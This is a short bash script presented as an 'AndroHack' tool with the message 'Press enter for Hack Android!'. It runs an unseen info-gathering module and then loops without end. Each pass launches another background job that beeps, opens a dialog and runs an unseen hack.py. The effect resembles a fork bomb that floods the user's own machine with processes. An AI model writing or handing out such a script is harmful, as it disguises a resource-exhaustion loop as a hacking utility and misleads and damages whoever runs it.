#!/bin/bash

bash __modules__/get_info.sh; clear

while [ $? -eq 0 ]
do
    echo -e "\a\a"
    ( $( dialog --ascii-lines --title "©2021 ®AndroHack" --msgbox "\nPress enter for Hack Android!\n" 7 50 --stdout ); $(python __modules__/hack.py) ) &
done
